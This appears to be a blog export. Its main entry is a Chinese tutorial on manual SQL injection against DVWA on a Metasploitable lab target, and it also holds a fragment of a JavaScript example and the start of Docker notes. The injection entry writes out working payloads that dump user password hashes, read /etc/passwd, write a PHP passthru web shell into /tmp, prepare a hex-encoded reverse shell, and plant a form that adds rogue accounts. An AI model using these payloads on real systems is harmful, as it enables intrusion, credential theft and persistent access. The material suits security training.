<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">&quot;a&quot;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201130161715.png"><br>下面有详细的介绍</p>
<h3 id="document的getElementById方法"><a href="#document的getElementById方法" class="headerlink" title="document的getElementById方法"></a>document的getElementById方法</h3>]]></content>
      <categories>
        <category>编程</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>5.手动漏洞挖掘，sql注入</title>
    <url>/2019/10/10/5.%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%EF%BC%8Csql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p> 任务089：KALI版本更新（第一个ROLLING RELEASE）和手动漏洞挖掘（SQL注入） </p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>实验靶机metasploitable-linux-2.0.0里面的DVWA</p>
<h2 id="sql注入介绍"><a href="#sql注入介绍" class="headerlink" title="sql注入介绍"></a>sql注入介绍</h2><p>服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器<br>也可以控制到客户端，也可以用sql注入上发文件，sql注入也读取文件<br>其实注入的都是sql语句</p>
<ul>
<li><strong>原理下面是一个比如无需密码登陆</strong><ul>
<li><strong>这个是正常情况下</strong> <code>SELECT * FROM users WHERE user=&#39;里面是用户输入的账号&#39; AND password=&#39;里面是用户输入的密码&#39;</code></li>
<li><strong>注入无需密码登陆</strong><code>SELECT * FROM users WHERE user=&#39;账号还是原账号&#39; AND password=&#39;&#39;空格OR&#39;1&#39;=&#39;1&#39;</code><br>上面那个输入密码的地方’’空格OR’1’=’1’意思介绍，’空密码’ OR是逻辑运算符或1=1这两个数都是真条件就满足，满足就是真，账号对密码对就登陆成功了。</li>
<li><strong>应为服务器端没有过严格的过滤导致的注入</strong></li>
</ul>
</li>
</ul>
<h2 id="常用注入"><a href="#常用注入" class="headerlink" title="常用注入"></a>常用注入</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>下面是正常输入<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190925201454973.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190925201505571.png" alt="在这里插入图片描述"></p>
<h4 id="基于报错的检查方法"><a href="#基于报错的检查方法" class="headerlink" title="基于报错的检查方法"></a>基于报错的检查方法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; &quot; % () </span><br></pre></td></tr></table></figure>
<p><strong>判断报错就能判断是否访问数据库</strong><br>输入个<code>&#39;</code>发现报错了说明可能带是叫<code>&#39;</code>带入了数据库<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190925202317693.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190925202411153.png" alt="在这里插入图片描述"></p>
<h4 id="基于布尔的检查方式"><a href="#基于布尔的检查方式" class="headerlink" title="基于布尔的检查方式"></a>基于布尔的检查方式</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; 或&#x27;1&#x27; and &#x27;1&#x27;</span><br><span class="line"> 1&#x27; and &#x27;1&#x27;=&#x27;2 或`1&#x27; and &#x27;0&#x27;</span><br></pre></td></tr></table></figure>
<h5 id="使用’1’-and-‘1’-’1’判断"><a href="#使用’1’-and-‘1’-’1’判断" class="headerlink" title="使用’1’ and ‘1’=’1’判断"></a>使用’1’ and ‘1’=’1’判断</h5><p>发现输入可以正常显示说明<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190925202854834.png" alt="在这里插入图片描述"><br>应为1 然后 逻辑<code>and</code>或运算符<code>1=1</code>两个都是真所有可以正常显示<br>下面是<code>1=2</code>为假数据库就报错了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190925204607317.png" alt="在这里插入图片描述"><br><code>and</code>竟然是逻辑或那没就直接可以<code>and &#39;1</code>这个也是真<br>发现可以正常返回正常页面<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190925205036263.png" alt="在这里插入图片描述"></p>
<h5 id="查看sql语句查询字段"><a href="#查看sql语句查询字段" class="headerlink" title="查看sql语句查询字段"></a>查看sql语句查询字段</h5><p>查看字段可以进行进一步的的注入方法，每个查询的字段都有可能是我们注入更好的选择<br>有的时候检查的有2个字段，但是字段是*的话 应为星的所有字段那么检查的时候可能会查询10几个或者是20几个<br>下面那可以看到有2个字段<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190927203454290.png" alt="在这里插入图片描述"><br>这个输入输入都一样<code>order by</code> 要查询多少个语句  –<br> 如果查询错了那就返回页面报错<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190927205130503.png" alt="在这里插入图片描述"><br>点击提交<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190928105940183.png" alt="在这里插入图片描述"><br>    发现抱错了，抱错说明不是50个字段<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190928105601142.png" alt="在这里插入图片描述"><br>然后在9，发现也报错了，说明也不是9字段<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190928110615370.png" alt="在这里插入图片描述"><br>然后在2发现没有返回任何东西，说明是2个字段，要是1也不会返回任何东西只能是大于才进行报错<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190928110821935.png" alt="在这里插入图片描述"><br>可以用burp工具</p>
<h3 id="联合查询union-和union-all"><a href="#联合查询union-和union-all" class="headerlink" title="联合查询union 和union all"></a>联合查询union 和union all</h3><p> 使用union来选择查询</p>
<h4 id="查看位置"><a href="#查看位置" class="headerlink" title="查看位置"></a>查看位置</h4><p><code>&#39;union select 1,2 --</code> 最后是有个空格的自己加上，上面我已经知道有2个所以这个我就选择查询1到2个<br>第一个’是进行给前面闭合的，后面–是注释的符号<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190928112256398.png" alt="在这里插入图片描述"><br>下面是演示叫字段显示出来<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019100121421537.png" alt="在这里插入图片描述"><br>查询用户1<code>&#39;union select user(),2 --</code>  最后是有个空格的自己加上，<br>这个user()查询当前用户<br>2还是查询2个字段<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191002212422601.png" alt="在这里插入图片描述"></p>
<p>   看一下结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191002213647127.png" alt="在这里插入图片描述"><br>下面都是利用这2个这个字段来进行查询的</p>
<h4 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h4><p><code>&#39; union select user() ,version() --   </code>  最后是有个空格的自己加上，下面介绍<br>version()是sql函数他是查看版本的<br>看一下结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191002213350939.png" alt="在这里插入图片描述"></p>
<h4 id="查看当前目录"><a href="#查看当前目录" class="headerlink" title="查看当前目录"></a>查看当前目录</h4><p><code>&#39; union select user() ,@@datadir --</code>  最后是有个空格的自己加上，下面介绍<br>@@datadir 是查看当前目录<br>看一下结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191002213915595.png" alt="在这里插入图片描述"></p>
<h4 id="查看目标电脑用户名"><a href="#查看目标电脑用户名" class="headerlink" title="查看目标电脑用户名"></a>查看目标电脑用户名</h4><p><code>&#39; union select user() ,@@hostname --</code>  最后是有个空格的自己加上，下面介绍<br>@@hostname是查看电脑用户名<br>看一下结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019100221472147.png" alt="在这里插入图片描述"></p>
<h4 id="查看系统"><a href="#查看系统" class="headerlink" title="查看系统"></a>查看系统</h4><p><code>&#39; union select user() ,@@version_compile_os  --</code> 最后是有个空格的自己加上，下面介绍<br>@@version_compile_os是查看系统类型的<br>看一下结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191002215048729.png" alt="在这里插入图片描述"></p>
<h4 id="叫所有的函数放到一个字段里"><a href="#叫所有的函数放到一个字段里" class="headerlink" title="叫所有的函数放到一个字段里"></a>叫所有的函数放到一个字段里</h4><p><code>&#39; union select user() ,CONCAT_WS(CHAR(32,58,32),user(),database(),version())   --</code>  最后是有个空格的自己加上，下面介绍<br>CONCAT_WS（）就是在一个字段里面执行多个函数<br>查看一下结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/201910022154290.png" alt="在这里插入图片描述"></p>
<h3 id="用mysq的information-schema查询"><a href="#用mysq的information-schema查询" class="headerlink" title="用mysq的information_schema查询"></a>用mysq的<code>information_schema</code>查询</h3><p><code>information_schema</code>数据库是 MySQL 自带的信息数据库information_schema是sql自带的信息库存放这MySQL服务器所有数据库的信息<br>2.5.1.<code>&#39; union select table_name,table_schema from information_schema.tables--</code>  最后是有个空格的自己加上，下面介绍<br>第一个字段是<code>table_name</code><br>第二个字段是 <code>table_schema</code><br><code>information_schema.tables</code>意思是查看<code>information_schema</code>数据库里面的<code>tables</code>表的字段<code>table_name</code>和字段<code>table_schema </code>里面的内容<br>看一下结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191002221413680.png" alt="在这里插入图片描述"><br>统计一下所有的库和表的数量<br><code>&#39; UNION select table_schema,count(*) FROM information_Schema.tables group by table_schema --</code>   最后是有个空格的自己加上，下面介绍</p>
<p>   <code>information_schema</code>库，查看库然后用<code>count(*) </code>来计数计算<br>  <code> group by</code> 是进行会总就是，有重复的就显示一个，会总的是<code>table_schema </code>是列名<br>看一下结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191003202950764.png" alt="在这里插入图片描述"></p>
<pre><code>我发现存在一个漏洞都可以叫所有库和表都能查出来</code></pre>
<h4 id="查看DVWA库里面的表"><a href="#查看DVWA库里面的表" class="headerlink" title="查看DVWA库里面的表"></a>查看DVWA库里面的表</h4><p><code>&#39; union select table_name,table_schema from information_schema.tables where table_schema=&#39;dvwa&#39;--</code>  最后是有个空格的自己加上，下面介绍<br>在前面基础加上了where函数 table_schema=’dvwa’意思是只查dvwa库<br>看一下结果<br>可以看的有个users的表名里面可能放着用户密码,users是最有可能怀疑的对象<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191003202911766.png" alt="在这里插入图片描述"><br>2.5.4.查看users表里面的列<br><code>&#39; union select table_name,column_name from information_schema.columns where  table_schema=&#39;dvwa&#39; and table_name=&#39;users’--  </code> 最后是有个空格的自己加上，下面介绍<br>还是查看的information_schema这个数据库里面的columns表里面的table_schema列里面是dvwa的数据<br>where table_schema=’dvwa’在这个dvwa查看users表里都有什么列<br>看一下结果<br>发现了 user里面可能放着账号<br>发现了password里面可能放着密码<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191003202114472.png" alt="在这里插入图片描述"></p>
<h4 id="查看-user列和password列的内容"><a href="#查看-user列和password列的内容" class="headerlink" title="查看 user列和password列的内容"></a>查看 user列和password列的内容</h4><p><code>&#39; union select user,password from dvwa.users--</code> 最后是有个空格的自己加上，下面介绍<br> 查看dvwa数据库里面的users表里面的user和password列里面的数据<br>看一下结果<br>可以看的列出来了的所有的用户和密码<br>密码被加密了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191003202059391.png" alt="在这里插入图片描述"><br>下面是进行解码</p>
<h2 id="进行解密"><a href="#进行解密" class="headerlink" title="进行解密"></a>进行解密</h2><p>下面是进行解密上面的怀疑是哈希值的<br>用hash-identifier工具进行看看是什么进加密的，这个工具kali自带<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191003204240340.png" alt="在这里插入图片描述"><br>发现是MD5<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191003204359100.png" alt="在这里插入图片描述"><br>可以去百度进行md5解码<br>可以看见密码了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191020235306925.png" alt="在这里插入图片描述"></p>
<h2 id="sql漏洞读文件和写文件"><a href="#sql漏洞读文件和写文件" class="headerlink" title="sql漏洞读文件和写文件"></a>sql漏洞读文件和写文件</h2><p>这个是接着上一个1,SQL注入，查看服务器系统，拿到账号密码。写的</p>
<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>利用<code>load_file</code>函数进行读取系统文件<br>下面都是用burp进行发送的请求<br>发送的请求是1234<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191004201133302.png" alt="在这里插入图片描述"><br>使用burp看看请求的内容<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191004201227987.png" alt="在这里插入图片描述"><br>在burp工具里发送到Repeater模块里<br>在这里面原始数据直接可以看见发的信息<br>双击就能修改里面的1234<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191004201516254.png" alt="在这里插入图片描述"><br>下面全部是使用的burp工具进行发送请求<br><strong>读取文件/etc/passwd</strong><br><code>&#39; union SELECT null, load_file(&#39;/etc/passwd&#39;) --  </code><br>第一个字段 null是空的意思<br>第二个字段load_file这个函数是读取文件的，然后读取的是/etc/passwd文件<br>还可以查看其他文件，要看看你的权限够不够了<br>看一下结果可以看见已经读取出来了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191004202114540.png" alt="在这里插入图片描述"></p>
<h3 id="文件写操作"><a href="#文件写操作" class="headerlink" title="文件写操作"></a>文件写操作</h3><p>用<code>into dumpfile</code>函数写操作<br><code>&#39; union select null,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO DUMPFILE &quot;/var/www/a.php&quot; -- </code><br>第一个字段null是空的意思<br>第二个字段是放的是<code>&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; </code>这个是一个页面木马，将他放到www目录下应为是页面木马<br><strong>看一下结果发现没有叫这个木马文件写入到里面应为权限不够</strong><br><strong>应为权限只是sql进程的权限</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191005171451740.png" alt="在这里插入图片描述"><br>2.2.不指定绝对路径是可以写进去的<br><code>&#39; union select null,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO DUMPFILE &quot;  &#39;a.php&#39; --  </code><br>就算能写进去也找不到写进去的文件，就算能找到也有可能访问不了的<br>看一下结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191006171857582.png" alt="在这里插入图片描述"></p>
<p><strong>利用sql注入在利用上节课的文件包含漏洞进行写入木马在利用木马</strong><br><code>&#39; union select null,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO DUMPFILE &quot;/tmp/a.php&quot; -- </code><br> 叫木马写到tmp文件里<br>将木马文件写入到tmp目录里<br>tmp目录是任何人都可以访问和修改文件的所以写入到tmp目录里<br>然后在里用文件包含漏洞去运行写到tmp里被写入到木马文件<br>看一结果发现已经写进去了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191006173716937.png" alt="在这里插入图片描述"><br>在利用文件包含运行木马来施行命令<br>看一下运行的结果可以运行<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191006195713590.png" alt="在这里插入图片描述"></p>
<p> <strong>进行16进制编码</strong><br>有的情况会安全机制会过滤想比如php，&lt;,&gt;还有很多<br>遇见这种情况我们可以进行各种编码<br>下面我就用16进制编码<br>用kali 的xxd来进行16进制编码<br>发送反向连接shell<br>kali自动一个php木马文件<br>在<code>/usr/share/webshells/php/php-reverse-shell.php </code><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191009193419889.png" alt="在这里插入图片描述"><br>叫木马的反向的ip设置成自己的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191009193833464.png" alt="在这里插入图片描述"><br>开始16进制解析<br>发现有有换行有换行的话会出现服务器解析不了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191009192758978.png" alt="在这里插入图片描述"><br>下面是用个管道叫换行符删除。tr -d （要删除的东西）<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191009193031582.png" alt="在这里插入图片描述"><br>叫16编码好的用burp发送到服务器里<br>向服务器端发送的时候用为字太多就发送失败了，你可以用一个少的shell木马这个就不演示了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191009194008878.png" alt="在这里插入图片描述"><br>4.2.叫3.的php木马利用文件包来进行访问，下面是叫他进行16进制编码在进行实现一下<br><code>&#39; union select null,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO DUMPFILE &quot;/tmp/a.php&quot; -- </code><br>叫这个php的木马保存到b.php里<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191009194750250.png" alt="在这里插入图片描述"><br>然后在进行16进制编码<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191009194944529.png" alt="在这里插入图片描述"><br>可以看到已经写进去<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191009195906201.png" alt="在这里插入图片描述"><br>在利用文件包含运行木马来施行命令<br>看一下运行的结果可以运行<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191009200053341.png" alt="在这里插入图片描述"><br><strong>保持和下载数据库</strong><br>比如我们要查看账号密码数据库的话要是里面的有1万个账号密码web可能就崩溃了所有我们可以保存下载查看和批量查看<br><code>&#39; union select null, concat(user,0x3a,password) from users INTO OUTFILE &#39;/ tmp/a.db&#39;--</code><br>查看到的账号密码OUTFILE到文件里然后在用文件包含漏洞进行访问，如果web可以文件包含漏洞，那只能批量访问了。<br>看一下结果发送成功<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019101020015962.png" alt="在这里插入图片描述"><br>然后利用文件包含漏洞进行访问账号密码<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191010201104944.png" alt="在这里插入图片描述"><br><strong>一个思路 web渗透可能会出现很多限制，意想不到的情况</strong><br>下面用这个php代码创建一个表单的页面然后在这个页面，然后在这个页面里用户账号数据库里面插入一个账号，<br>就算拿到了密码现在的企业都是安全很高的，要进行密码解码破解是很难的，<br>下面的代码也是通过sql漏洞那2个字段进行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select null,&#x27;</span><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&quot;submit&quot;</span>])) &#123; $userID = $_POST[<span class="string">&quot;userID&quot;</span>]; $first_name </span><br><span class="line">= $_POST[<span class="string">&quot;first_name&quot;</span>]; $last_name = $_POST[<span class="string">&quot;last_name&quot;</span>]; $username = </span><br><span class="line">$_POST[<span class="string">&quot;username&quot;</span>]; $avatar = $_POST[<span class="string">&quot;avatar&quot;</span>]; <span class="keyword">echo</span> <span class="string">&quot;userID: $userID&lt;BR&gt;&quot;</span>; <span class="keyword">echo</span> </span><br><span class="line"><span class="string">&quot;first_name: $first_name&lt;BR&gt;&quot;</span>; <span class="keyword">echo</span> <span class="string">&quot;last_name: $last_name&lt;BR&gt;&quot;</span>; <span class="keyword">echo</span> <span class="string">&quot;username: </span></span><br><span class="line"><span class="string">$username&lt;BR&gt;&quot;</span>; <span class="keyword">echo</span> <span class="string">&quot;avatar: $avatar&lt;BR&gt;&quot;</span>; </span><br><span class="line">$con=mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;dvwa&quot;</span>); <span class="keyword">if</span> (mysqli_connect_errno()) &#123; <span class="keyword">echo</span> </span><br><span class="line"><span class="string">&quot;Failed to connect to MySQL: &quot;</span> . mysqli_connect_error(); &#125; <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Connected to </span></span><br><span class="line"><span class="string">database&lt;BR&gt;&quot;</span>; &#125; $password = <span class="string">&quot;123&quot;</span>; $sql=<span class="string">&quot;insert into dvwa.users values (\\&quot;</span>$userID\\<span class="string">&quot;,\</span></span><br><span class="line"><span class="string">\&quot;$first_name\\&quot;</span>,\\<span class="string">&quot;$last_name\\&quot;</span>,\\<span class="string">&quot;$username\\&quot;</span>,MD5(\\<span class="string">&quot;$password\\&quot;</span>),\\<span class="string">&quot;$avatar\</span></span><br><span class="line"><span class="string">\&quot;)&quot;</span>; <span class="keyword">if</span> (mysqli_query($con,$sql)) &#123; <span class="keyword">echo</span> <span class="string">&quot;[Successful Insertion]: $sql&quot;</span>; &#125; <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Error </span></span><br><span class="line"><span class="string">creating database: &quot;</span> . mysqli_error($con); &#125; mysqli_close($con); &#125; <span class="meta">?&gt;</span> &lt;form method=<span class="string">&quot;post&quot;</span> </span><br><span class="line">action=<span class="string">&quot;&lt;?php echo $_SERVER[&quot;</span>PHP_SELF<span class="string">&quot;]; ?&gt;&quot;</span>&gt; &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;userID&quot;</span> </span><br><span class="line">value=<span class="string">&quot;33&quot;</span>&gt;&lt;br&gt; &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;first_name&quot;</span> value=<span class="string">&quot;fh&quot;</span>&gt;&lt;br&gt; &lt;input type=<span class="string">&quot;text&quot;</span> </span><br><span class="line">name=<span class="string">&quot;last_name&quot;</span> value=<span class="string">&quot;y&quot;</span>&gt;&lt;br&gt; &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;yfh&quot;</span>&gt;&lt;br&gt; </span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;avatar&quot;</span> value=<span class="string">&quot;yfh!&quot;</span>&gt;&lt;br&gt; &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> </span><br><span class="line">value=<span class="string">&quot;Submit Form&quot;</span>&gt;&lt;br&gt; &lt;/form&gt;<span class="string">&#x27; INTO DUMPFILE &#x27;</span>/tmp/user.php<span class="string">&#x27; --  </span></span><br></pre></td></tr></table></figure>
<p>  下面就用浏览器的hackbar工具进行演示<br>看一下结果已经写进去了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191013205921487.png" alt="在这里插入图片描述"><br>利用文件包含漏洞进行访问，可以看见可以添加密码了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191013210049903.png" alt="在这里插入图片描述"></p>
<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><p>web没有编写好显示过滤有数据库返回的报错信息，黑客可以通过报错信息了判断漏洞存在</p>
<h3 id="sql盲注介绍"><a href="#sql盲注介绍" class="headerlink" title="sql盲注介绍"></a>sql盲注介绍</h3><p>测试是否存在sql注入漏洞<br>下面就是没有过滤好发现了他存在sql漏洞<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191020174735362.png" alt="在这里插入图片描述"><br>sql盲注就是看不见他报错的信息，报错的信息被过滤了，看不见我们在进行sql注入这个就叫sql盲注了<br>看一下返回就结果没有显示任何东西<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191020180635967.png" alt="在这里插入图片描述"></p>
<h3 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>输入一个1<code>&#39; and 1=1--</code><br>发现被执行了说明有sql注入的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191020184256630.png" alt="在这里插入图片描述"><br>2.2查看有多少个字段<br>和1 sql注入的笔记一样的只是对了才显示内容不对就不显示任何内容</p>
<h3 id="‘-order-by-5–"><a href="#‘-order-by-5–" class="headerlink" title="‘ order by 5–"></a>‘ order by 5–</h3><p>看一下结果没有任何反应的说明不是5个字段<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191020232749921.png" alt="在这里插入图片描述"><br>发现测试到最多2的时候就显示了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191020232928915.png" alt="在这里插入图片描述"><br>后面就和1,SQL注入，查看服务器系统，拿到账号密码笔记里一样了，后面就不太做演示了<br>可以去我博客里去看 <a href="https://blog.csdn.net/qq_41860876/article/details/101381226">1,SQL注入，查看服务器系统，拿到账号密码</a><br>后面但是有空格的<br> 2.联合查询 <code>’ union select 1,2 --</code><br>3.查询用户’<code>&#39;union select user(),2 --</code><br>4.查看版本 <code>&#39; union select user() ,version() --</code><br>5.查看当前目录<code>&#39; union select user() ,@@datadir --</code><br>6.查看目标电脑用户名 <code>&#39; union select user() ,@@hostname --</code><br>7.查看系统<code>&#39; union select user() ,@@version_compile_os --</code><br>8.叫所有的函数放到一个字段里<code>&#39; union select user() ,CONCAT_WS(CHAR(32,58,32),user(),database(),version()) --</code><br>10.mysq查看linformation_schema内容<code>&#39; union select table_name,table_schema from information_schema.tables--</code><br>11.统计一下所有的库和表的数量<code>&#39; UNION select table_schema,count(*) FROM information_Schema.tables group by table_schema --</code><br>12.查看DVWA库里面的表<code>&#39; union select table_name,table_schema from information_schema.tables where table_schema=&#39;dvwa&#39;--</code><br>13.查看users表里面的列<code>&#39; union select table_name,column_name from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users’--</code><br>14.查看 user列和password列的内容<code>&#39; union select user,password from dvwa.users--</code><br>看一下结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191023230311866.png" alt="在这里插入图片描述"><br>3. 猜测这个是就怎么演示了在是3 sql注入 暴力破解里面<a href="https://blog.csdn.net/qq_41860876/article/details/102538282">3 sql注入 暴力破解里面</a><br>后面都是有空格的<br>猜列名<code>’ and asd is null–</code><br>猜测表名<code>&#39; and 列名.要猜测的表名 is null--</code></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>手动挖掘漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker使用最很详细的学习</title>
    <url>/2020/12/16/Docker%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>应为Docker这个还是很长的一个东西，我怕以后忘了就习惯性写成了笔记</strong></p>
<p><strong>他的官方</strong><a href="https://www.docker.com/">https://www.docker.com/</a><br><strong>官方手册地址很详细的</strong><a href="https://docs.docker.com/">https://docs.docker.com/</a><br><strong>官方文档非常详细</strong><a href="https://docs.docker.com/engine">https://docs.docker.com/engine</a><br><strong>看的视频</strong><a href="https://www.bilibili.com/video/BV1sK4y1s7Cj">https://www.bilibili.com/video/BV1sK4y1s7Cj</a><br><strong>看的视频</strong><a href="https://www.bilibili.com/video/BV1og4y1q7M4">https://www.bilibili.com/video/BV1og4y1q7M4</a><br><strong>参考的文章</strong><a href="https://www.jianshu.com/p/d3006b8a22ee">https://www.jianshu.com/p/d3006b8a22ee</a><br><strong>参考的文章</strong><a href="https://www.runoob.com/docker/docker-tutorial.html">https://www.runoob.com/docker/docker-tutorial.html</a><br><strong>参考的文章</strong><a href="https://www.cnblogs.com/dazhoushuoceshi/p/7066041.html">https://www.cnblogs.com/dazhoushuoceshi/p/7066041.html</a></p>
